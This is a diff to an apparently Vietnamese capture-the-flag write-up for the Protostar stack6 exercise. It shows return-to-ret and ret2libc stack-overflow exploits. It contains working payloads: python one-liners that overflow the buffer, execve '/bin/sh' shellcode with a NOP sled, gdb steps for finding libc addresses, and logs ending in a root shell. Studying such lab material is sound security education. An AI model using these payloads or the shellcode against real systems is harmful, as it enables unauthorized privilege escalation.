@@ -77,7 +77,7 @@ int main(int argc, char **argv)
 0x08048508 <main+14>:   ret
 
 ```
-Hàm `getpath` không cho phép `eip` của caller có dạng `0xbfxxxxxx`, tương đương với địa chỉ của bộ nhớ stack.
+Hàm `getpath` không cho phép `eip` của caller có dạng `0xbf??????`, tương đương với địa chỉ của bộ nhớ stack.
 Do vậy, kỹ thuật của bài trước sẽ cần phải thay đổi.
 
 Về cơ bản, đoạn code inject vào chương trình được lưu trong stack.
@@ -98,7 +98,7 @@ python -c "print '\xcc' * 64 + '\xcc' * 4 + '\xcc' * 8 + '\xcc' * 4 + '\xf9\x84\
 ```
 Đoạn script trên ghi đè lên 64 byte giá trị `buffer`, 4 byte giá trị biến `ret`, 8 byte padding, 4 byte `eip` mới của caller, và 4 byte địa chỉ injected code.
 Sau đây là bộ nhớ trước và sau `gets`.
-Phân biệt <span style="color:aqua">buffer</span>, <span style="color:red">eip mới của caller</span>, và <span style="color:springgreen">địa chỉ điều hướng về injected code</span>.
+Phân biệt <span style="color:aqua">buffer</span>, <span style="color:orangered">eip mới của caller</span>, và <span style="color:springgreen">địa chỉ điều hướng về injected code</span>.
 <pre class="memory">
 0xbffff730:     0xbffff74c      0x00000000      0xb7fe1b28      0x00000001
 0xbffff740:     0x00000000      0x00000001      0xb7fff8f8      <span style="color:aqua">0xb7f0186e</span>
@@ -115,13 +115,131 @@ Phân biệt <span style="color:aqua">buffer</span>, <span style="color:red">eip
 0xbffff750:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
 0xbffff760:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
 0xbffff770:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
-0xbffff780:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      0xcccccccc</span>
+0xbffff780:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      0xcccccccc
 0xbffff790:     0xcccccccc      0xcccccccc      0xcccccccc      <span style="color:orangered">0x080484f9</span>
 0xbffff7a0:     <span style="color:springgreen">0xbffff76c</span>      0x00000000      0xbffff828      0xb7eadc76
 </pre>
+Chương trình sẽ chạy bình thường cho đến lệnh `ret` của hàm `getpath`.
+Sau đó, chương trình sẽ được điều hướng đến lệnh `ret` của `getpath` một lần nữa.
+Địa chỉ của đoạn injected code lúc này được `pop` vào `eip` và đoạn code này được thực thi.
+Sau đây là chuỗi chương trình được ghép lại để bạn dễ hình dung.
+<pre class="memory">
+0x080484aa <getpath+38>:        call   0x8048380 <gets@plt>
+...
+0x080484f8 <getpath+116>:       leave
+0x080484f9 <getpath+117>:       ret
+<span style="color:orangered">0x080484f9 <getpath+117>:       ret</span>
+<span style="color:springgreen">0xbffff76c:                     int3</span>
+</pre>
+Lưu ý, đoạn injected code trong ví dụ chỉ là trap breakpoint.
+Chúng ta có thể sử dụng shellcode và NOP-sled như phần tham khảo cuối bài.
+
+Ngoài ROP, chúng ta cũng có thể sử dụng 1 phương pháp khác có tên ret2libc.
+Phương pháp này có thể dùng để chống lại các phương thức bảo mật cao hơn như cấm thực thi lệnh lưu ngoài vùng cho phép.
+Sau đây là ví dụ sử dụng hàm `system` trong libc để chạy các chương trình khác.
+Để tìm ra địa chỉ của `system`, ta có thể chạy lệnh print trong gdb:
+
+```bash
+(gdb) b main
+(gdb) run < input.txt
+(gdb) print system
+```
+Hàm `system` cần thêm tham số là pointer đến chuỗi ký tự lệnh.
+Ví dụ, nếu muốn chạy "/bin/sh", ta cần cung cấp địa chỉ của chuỗi này cho hàm `system`
+Để tìm được địa chỉ chuỗi này, ta có thể dùng lệnh bash sau:
+```bash
+strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
+```
+Kết quả trả về sẽ bao gồm offset của chuỗi, `0x11f3bf`, so với địa chỉ của libc khi chương trình stack6 được chạy.
+Muốn tìm địa chỉ của libc khi process đang chạy, hãy dùng lệnh sau trong gdb:
+```bash
+(gdb) info proc map
+```
+Ta nhận được địa chỉ của libc nằm tại `0xb7e97000`
+Kết hợp offset và địa chỉ, chuỗi "/bin/sh" có thể tìm thấy tại `0xb7fb63bf`.
+Sau cùng, giá trị `buffer` để làm tràn và exploit chương trình sẽ như sau:
+```bash
+python -c "print '\xcc' * 80 + '\xb0\xff\xec\xb7' + 'AAAA' + '\xbf\x63\xfb\xb7'" > input.txt
+```
+Giá trị này bao gồm 80 byte chung cho `buffer`, biến `ret`, `padding`, và `ebp` của caller.
+4 byte tiếp theo dành cho `eip` mới của caller, sẽ chỉ đến hàm `system`.
+4 byte tiếp theo là `eip` của hàm gọi hàm `system`, cụ thể trong ví dụ này chính là hàm `getpath`.
+Tuy nhiên, chúng ta cũng không cần quan tâm giá trị này vì mục đích chính là exploit chương trình.
+4 byte cuối là tham số cho hàm `system` và chính là địa chỉ của chuỗi có sẵn "/bin/sh".
+Bộ nhớ sau `gets` sẽ như sau.
+Phân biệt <span style="color:aqua">buffer</span>, <span style="color:orangered">eip mới của caller (địa chỉ libc system)</span>, <span style="color:yellow">eip sau khi return từ system</span>, và <span style="color:springgreen">tham số của system (địa chỉ của "/bin/sh")</span>.
+<pre class="memory">
+0xbffff730:     0xbffff74c      0x00000000      0xb7fe1b28      0x00000001
+0xbffff740:     0x00000000      0x00000001      0xb7fff8f8      <span style="color:aqua">0xcccccccc</span>
+0xbffff750:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
+0xbffff760:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
+0xbffff770:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
+0xbffff780:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      0xcccccccc
+0xbffff790:     0xcccccccc      0xcccccccc      0xcccccccc      <span style="color:orangered">0xb7ecffb0</span>
+0xbffff7a0:     <span style="color:yellow">0x41414141</span>      <span style="color:springgreen">0xb7fb63bf</span>      0xbffff800      0xb7eadc76
+</pre>
+
 ## Ref
 ```bash
-user@protostar:~$ export GREENIE=$'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888\x0a\x0d\x0a\x0d'
-user@protostar:~$ stack2
-you have correctly modified the variable
+user@protostar:~$ python -c "print 'ABC\x00' + '\x90' * 32 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 16 + '\xf9\x84\x04\x08' + '\x70\xf7\xff\xbf'" > input.txt
+user@protostar:~$ (cat input.txt; cat) | stack6
+input path please: got path ABC
+whoami
+root
+id
+uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+exit
+
+```
+```bash
+user@protostar:~$ python -c "print 'ABCD' + '\x00' * 76 + '\xb0\xff\xec\xb7' + 'AAAA' + '\xbf\x63\xfb\xb7'" > input.txt
+user@protostar:~$ (cat input.txt; cat) | stack6
+input path please: got path ABCD
+whoami
+root
+id
+uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+exit
+
+Segmentation fault
+```
+```bash
+(gdb) b main
+Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
+(gdb) run < input.txt
+Starting program: /opt/protostar/bin/stack6 < input.txt
+
+Breakpoint 1, main (argc=1, argv=0xbffff854) at stack6/stack6.c:27
+27      stack6/stack6.c: No such file or directory.
+        in stack6/stack6.c
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
+```
+```bash
+(gdb) info proc map
+process 11046
+cmdline = '/opt/protostar/bin/stack6'
+cwd = '/home/user'
+exe = '/opt/protostar/bin/stack6'
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
+         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
+        0xb7e96000 0xb7e97000     0x1000          0
+        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
+        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
+        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+        0xb7fd9000 0xb7fdc000     0x3000          0
+        0xb7fe0000 0xb7fe2000     0x2000          0
+        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
+        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
+        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+        0xbffeb000 0xc0000000    0x15000          0           [stack]
+```
+```bash
+user@protostar:~$ strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
+ 11f3bf /bin/sh
 ```
